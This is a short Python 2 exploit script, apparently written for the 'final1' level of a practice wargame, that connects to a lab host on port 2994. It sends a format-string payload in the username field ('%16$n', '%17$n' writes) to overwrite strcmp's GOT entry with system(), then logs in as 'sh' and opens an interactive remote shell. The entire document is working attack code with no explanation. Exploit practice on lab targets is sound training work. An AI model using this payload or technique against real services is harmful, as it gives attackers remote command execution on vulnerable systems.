import socket
import struct
import telnetlib
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.128.132', 2994))
def read_until(check):
        buffer=''
        while check not in buffer:
                buffer+=s.recv(1)
        return buffer
ip,port=s.getsockname()
port=str(port)
host = ip + ":" + port
print("this is the ip -> " +host)
STRCMP=struct.pack("I",0x804a1a8)
STRCMP = '\xa8\xa1\x04\x08'
STR2= '\xaa\xa1\x04\x08'
#overwrite the location with system() 0xb7ecffb0
username = 'A'+STRCMP +STR2+'%65412d'+'%16$n' +'%47164d' + '%17$n'
login = 'sh'
print read_until("[final1] $ ")
s.send('username '+username +'\n')
print read_until("[final1] $ ")
s.send('login '+login + "\n")
print read_until("[final1] $ ")
t=telnetlib.Telnet()
t.sock=s
t.interact()